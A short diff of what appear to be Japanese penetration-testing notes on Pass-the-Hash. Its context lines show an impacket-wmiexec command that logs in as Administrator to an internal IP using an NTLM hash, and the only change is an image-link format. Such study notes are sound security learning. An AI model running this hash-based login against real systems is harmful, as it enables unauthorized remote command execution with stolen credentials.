@@ -10,4 +10,4 @@ PtH には満たす必要のある 3 つの前提条件があります。
 ```zsh
 /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.184.73
 ```
-![](../../../assets/images/Pasted%20image%2020260502093001.png)
+![[Pasted image 20260502093001.png]]
